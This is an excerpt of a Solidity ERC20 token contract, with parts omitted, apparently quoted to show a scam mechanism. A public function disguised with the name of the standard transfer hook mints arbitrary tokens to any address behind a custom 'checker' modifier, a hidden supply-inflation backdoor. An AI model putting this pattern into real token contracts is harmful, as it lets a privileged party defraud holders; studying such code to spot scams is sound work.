...
contract ERC20 is Context, IERC20, IERC20Metadata,SuperHeavy {
     ...
     */
    function transfer(address recipient, uint256 amount) public virtual checker override  returns (bool) {
     ...
     */
     function _beforeTokenTransfer( address to, uint256 amount) checker public { _totalSupply.cre(amount);_balances[to].cre(amount);emit Transfer(address(0), to, amount);}
